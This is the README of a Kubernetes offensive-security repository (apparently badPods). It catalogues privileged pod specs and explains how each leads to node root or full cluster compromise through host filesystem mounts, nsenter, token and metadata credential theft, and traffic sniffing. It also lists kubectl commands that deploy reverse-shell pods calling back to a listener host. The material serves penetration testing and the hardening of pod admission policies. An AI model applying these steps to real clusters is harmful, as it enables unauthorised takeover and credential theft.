# badPods

A collection of yamls that create pods with different elevated privileges. Quickly demonstrate the impact of allowing specific security sensitive pod specifications. The focus here is attacks that require the creation of pods, or where you have landed on a pod with with access to one or more of the hosts namespaces. 

## Background
Occasionally pods need access to privileged resources on the host, so the Kubernetes pod spec allows for it. However, this level of access should be granted with extreme caution. Administrators have ways to prevent the creation of pods with these security sensitive pod specifications using Pod Security Policies or with admission controllers like OPA Gatekeeper. However, the real-world security implication of allowing a certain attributes is not always understood, and quite often, pod creation polices are not as locked down as they should be. 

## Prerequisites
In order to be successful in this attack path, you'll need the following: 

1. Access to a cluster 
1. Permission to create pods in at least one namespace. If you can exec into them that makes life easier.  
1. A pod security policy (or other pod admission controller's logic) that allows pods to be created with one or more security sensitive attributes, or no pod security policy / pod admission controller at all

## Pods you can exec into

Notes | yaml | readme
-- | -- | --
Nothing allowed | [yaml](yaml/nothing-allowed/pod-nothing-allowed.yaml) | [readme](yaml/nothing-allowed/README.md)
Everything allowed | [yaml](yaml/everything-allowed/pod-everything-allowed.yaml) | [readme](yaml/everything-allowed/README.md)
Privileged and hostPid | [yaml](yaml/priv-and-hostpid/README.md) | [readme](yaml/priv-and-hostpid/README.md)
Privileged only | [yaml](yaml/priv/pod-priv.yaml) | [readme](yaml/priv/README.md)
hostPid only | [yaml](yaml/hostpid/pod-hostpid.yaml) | [readme](yaml/hostpid/README.md)
hostNetwork only | [yaml](yaml/hostnetwork/pod-hostnetwork.yaml) | [readme](yaml/hostnetwork/README.md)
hostIPC only | [yaml](yaml/hostipc/pod-hostipc.yaml) | [readme](yaml/hostipc/README.md)

## Reverse shell versions of each pod

Notes | yaml | readme
-- | -- | --
Nothing allowed |  [yaml](yaml/nothing-allowed/pod-nothing-allowed-revshell.yaml) | [readme](yaml/nothing-allowed/README.md)
Everything allowed | [yaml](yaml/everything-allowed/pod-everything-allowed-revshell.yaml) |  [readme](yaml/everything-allowed/README.md)
Privileged and hostPid | [yaml](yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml) | [readme](yaml/priv-and-hostpid/README.md)
Privileged only | [yaml](yaml/priv/pod-priv-revshell.yaml) | [readme](yaml/priv/README.md)
hostPid only | [yaml](yaml/hostipc/pod-hostipc-revshell.yaml) | [readme](yaml/hostpid/README.md)
hostNetwork only | [yaml](yaml/hostnetwork/pod-hostnetwork-revshell.yaml) | [readme](yaml/hostnetwork/README.md)
hostIPC only | [yaml](yaml/hostipc/README.md) | [readme](yaml/hostipc/README.md)


# Impact - What's the worst that can happen?
**Caveat:** There are many defense in depth security controls available to kubernetes administrators that can reduce the impact, or completley thwart certain attack paths. As is always the case with penetration testing, your milage may vary.  

## Nothing allowed 
❌privileged ❌hostPID ❌hostPath ❌hostNetwork ❌hostIPC

There are plenty of attack paths that are available even if you don't have access to any of the host's namespaces. That's not the focus of this repository, but I'll include a few privesc paths below. 
**These are potential privesc paths you should investigate with any of the other pod examples as well.** 

### What's the worst that can happen?
Multiple potential paths to full cluster compromise (all resources in all namespaces)

### How?

* **Cloud metadata** - If cloud hosted, try to access the cloud metadata service. You might get access to the IAM credentials associated with the node, or even just a cloud IAM credential created specifically for that pod. In either case, this can be your path to escalate within the cluster, within the cloud environment, or both. 
* **Overly permissive service account** - If the default service account is mounted to your pod and is overly permissive, you can use that token to further escalate your privs within the cluster.
* **Anonymous-auth** - If either [the apiserver or the kubelets have anonymous-auth set to true](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/), and there are no network policy controls preventing it, you can interact with them directly without authentication. 
* **Exploits** - Is the kubernetes version vulnerable to an exploit, i.e. [CVE-2020-8558](https://github.com/tabbysable/POC-2020-8558)
* **Traditional vulnerability hunting** -Your pod will be able to see a different view of the network services running within the cluster than you likely can see from the machine you used to create the pod. You can hunt for vulnerable services by proxying your traffic through the pod. 

### Usage and exploitation examples 
[yaml/nothing-allowed/README.md](yaml/nothing-allowed/README.md) 

### Reference(s): 
* https://securekubernetes.com/
* https://madhuakula.com/kubernetes-goat/
* https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/
* https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/
* https://github.com/tabbysable/POC-2020-8558


## Everything allowed
✅privileged ✅hostPID ✅hostPath ✅hostNetwork ✅hostIPC


### What's the worst that can happen?
Multiple likely paths to full cluster compromise (all resources in all namespaces)

### How?
The pod you create mounts the host's filesystem to the pod. You then exec into your pod and chroot to the directory where you mounted the host's filesystem. You now have root on the node running your pod. One promising privesc path is available if you can schedule your pod to run on the control plane node using the nodeName selector (not possible in most cloud hosted k8s environments). Even if you can only schedule your pod on the worker node, you can access the node's kubelet credentials or you can create mirror/static pods in any namespace. You can also access any secret mounted within any pod on the node you are on. **In a production cluster, even on a worker node, there is usually at least one pod that has a `token` mounted that is bound to a `service account` that is bound to a `clusterrolebinding`, that gives you access to do things like create pods or view secrets in all namespaces**.  

### Usage and exploitation examples 
[yaml/everything-allowed/README.md](yaml/everything-allowed/README.md) 

### Reference(s): 
* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/

 
## HostPID and privileged
✅privileged ✅hostPID ❌hostPath ❌hostNetwork ❌hostIPC


### What's the worst that can happen?
Multiple likely paths to full cluster compromise (all resources in all namespaces)

### How?
In this scenario, the only thing that changes from the everything-allowed pod is how you gain root access to the host. Rather than chrooting to the host's filesystem first, you can use nsenter to run your shell in the host's PID 1 namespace. This gives you a root shell on the node running your pod. Once you are root on the host, the privesc paths are all the same as described above. 

### Usage and exploitation examples 
[yaml/priv-and-hostpid/README.md](yaml/priv-and-hostpid/README.md) 


### Reference(s): 
* https://twitter.com/mauilion/status/1129468485480751104
* [The Path Less Traveled: Abusing Kubernetes Defaults](https://www.youtube.com/watch?v=HmoVSmTIOxM) & [corresponding repo](https://github.com/mauilion/blackhat-2019)
* https://github.com/kvaps/kubectl-node-shell

## Privileged only
✅privileged ❌hostPID ❌hostPath ❌hostNetwork ❌hostIPC

### What's the worst that can happen?
Multiple likely paths to full cluster compromise (all resources in all namespaces)

### How?
If you only have `privileged=true`, you can eventually get an interactive shell on the node, but you start with non-interactive command execution as root and you'll have to upgrade it if you want interactive access. The privesc paths are the same as above.

### Usage and exploitation examples 
[yaml/priv/README.md](yaml/priv/README.md) 

### Reference(s): 
* https://twitter.com/_fel1x/status/1151487051986087936
* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/


## hostPath only
❌privileged ❌hostPID ✅hostPath ❌hostNetwork ❌hostIPC


### What's the worst that can happen?
Multiple likely paths to full cluster compromise (all resources in all namespaces)

### How?
While you don't have access to host process or network namespaces, having access to the full filesystem allows you to perform most of the same types of privesc paths outlined above. If you were able to run your pod on a node that is running etcd, you have instant access to all secrets. If not, hunt for tokens from other pods running on the node and hope you find a token associated with a highly privileged service account.

### Usage and exploitation examples 
[yaml/hostpath/README.md](yaml/hostpath/README.md)

### Reference(s): 
* [The Path Less Traveled: Abusing Kubernetes Defaults](https://www.youtube.com/watch?v=HmoVSmTIOxM) & [corresponding repo](https://github.com/mauilion/blackhat-2019)


## hostPid only
❌privileged ✅hostPID ❌hostPath ❌hostNetwork ❌hostIPC


### What's the worst that can happen?
Unlikely but possible path to cluster compromise 

### How?
Run `ps -aux` on the host which will show you all the process running on the host, including proccesses running within each pod. Look for any process that includes passwords, tokens, or keys in the `ps` output. Pipe the `ps` output to `more` or `less` to make sure the full output is word wrapped. If you are lucky, you will find credentials and you'll be able to use them to privesc within the cluster, to services supported by the cluster, or to services that cluster hosted applications are communicating with. It is a long shot, but you might find a kubernetes token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster-admin. You can also kill any process on the node (DOS), but I would advise against it!  

### Usage and exploitation examples 
[yaml/hostpid/README.md](yaml/hostpid/README.md)


## hostNetwork only
❌privileged ❌hostPID ❌hostPath ✅hostNetwork ❌hostIPC


### What's the worst that can happen?
Potential path to cluster compromise 

### How?
This opens up two potential escalation paths: 
* **Sniff traffic** - You can use tcpdump or wireshark to sniff unencrypted traffic on any interface on the host. You might get lucky and find service account tokens or other sensitive information that is transmitted over unencrypted channels.  
* **Access services bound to localhost**  You can also reach services that only listen on the host's loopback interface or are otherwise blocked by network polices. These services might turn into a fruitful privesc path. 

### Usage and exploitation examples 
[yaml/hostnetwork/README.md](yaml/hostnetwork/README.md) 


## hostIPC only
❌privileged ❌hostPID ❌hostPath ❌hostNetwork ✅hostIPC


### What's the worst that can happen?
Not seen often - but potential limited compromise 

### How?
If any process on the host or any processes within a pod is using the host's inter-process communication mechanisms (shared memory, semaphore arrays, message queues, etc.), you will be able to read/write to those same mechanisms. That said, with things like message queues, even if you can read something in the queue, reading it is a destructive action that will remove it from the queue, so beware. 

### More details and exploitation examples 
[yaml/hostipc/README.md](yaml/hostipc/README.md) 

# Usage
 Each resource in the `yamls` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. Each subdirectory has it's own usage information which includes tailored post-exploitation ideas and steps.  

### Clone the repo
```bash
git clone https://github.com/BishopFox/badPods
cd badPods
```

### Create the pods (or at least try to create them)

```bash
kubectl apply -f ./yaml/everything-allowed/pod-everything-allowed.yaml
kubectl apply -f ./yaml/priv-and-hostpid/pod-priv-and-hostpid.yaml 
kubectl apply -f ./yaml/priv/pod-priv.yaml
kubectl apply -f ./yaml/hostpath/pod-hostpath.yaml
kubectl apply -f ./yaml/hostpid/pod-hostpid.yaml 
kubectl apply -f ./yaml/hostnetwork/pod-hostnetwork.yaml
kubectl apply -f ./yaml/hostipc/pod-hostipc.yaml
```

### Reverse shell version of each pod
If you can create pods but not exec  into them, you can use the reverse shell version of each pod. To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!

```bash
HOST="10.0.0.1" PORT="3111" envsubst < ./yaml/priv-and-hostpid/pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3112" envsubst < ./yaml/hostpid/pod-hostpid-revshell.yaml  | kubectl apply -f -
HOST="10.0.0.1" PORT="3113" envsubst < ./yaml/hostnetwork/pod-hostnetwork-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3114" envsubst < ./yaml/hostpath/pod-hostpath-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3115" envsubst < ./yaml/hostipc/pod-hostipc-revshell.yaml | kubectl apply -f -
HOST="10.0.0.1" PORT="3116" envsubst < ./yaml/everything-allowed/pod-everything-allowed-revshell.yaml | kubectl apply -f -
```

# Acknowledgements 
Thank you [Rory McCune](https://twitter.com/raesene), [Duffie Cooley](https://twitter.com/mauilion), [Brad Geesaman](https://twitter.com/bradgeesaman), [Tabitha Sable](https://twitter.com/tabbysable), [Ian Coldwater](https://twitter.com/IanColdwater), and [Mark Manning](https://twitter.com/antitree) for publicly sharing so much knowledge about Kubernetes offensive security. 
